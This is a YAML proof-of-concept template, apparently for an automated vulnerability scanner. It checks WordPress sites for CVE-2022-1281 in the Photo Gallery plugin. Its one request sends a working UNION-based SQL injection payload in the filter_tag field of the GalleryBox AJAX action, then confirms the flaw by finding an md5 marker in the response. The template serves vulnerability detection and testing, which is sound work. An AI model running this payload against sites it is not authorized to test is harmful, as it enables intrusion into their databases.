name: poc-yaml-wordpress-photo-gallery-cve-2022-1281
manual: true
transport: http
set:
    f1: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php?image_id=123
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: action=GalleryBox&filter_tag=1%29%22+union%09select * from (select 123)a1 join (select 2)a2 join (select 3)a3 join (select 2)a4 join (select 2)a5 join (select md5('{{f1}}'))a6 join (select md5('{{f1}}'))a7 join (select 2)a8 join (select 2)a9 join (select 2)a10 join (select 2)a11 join (select 2)a12 join (select 2)a13 join (select 2)a14 join (select 2)a15 join (select 2)a16 join (select md5('{{f1}}'))a17 join (select md5('{{f1}}'))a18 join (select md5('{{f1}}'))a19 join (select md5('{{f1}}'))a20 join (select md5('{{f1}}'))a21 join (select md5('{{f1}}'))a22 join (select 2)a23%23
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(md5(f1)))
expression: r0()
detail:
    author: M00nl1ght
    links:
        - https://www.zilyun.com/23605.html
    vulnerability:
        id: CT-418967
        level: critical
